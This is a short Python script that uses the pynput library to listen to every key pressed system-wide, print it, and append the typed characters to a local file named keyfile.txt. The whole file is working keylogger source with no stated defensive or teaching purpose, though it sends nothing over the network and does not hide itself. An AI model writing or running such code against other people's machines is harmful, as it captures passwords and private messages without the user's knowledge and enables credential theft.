from pynput import keyboard

def main():
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", "a") as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")


main()

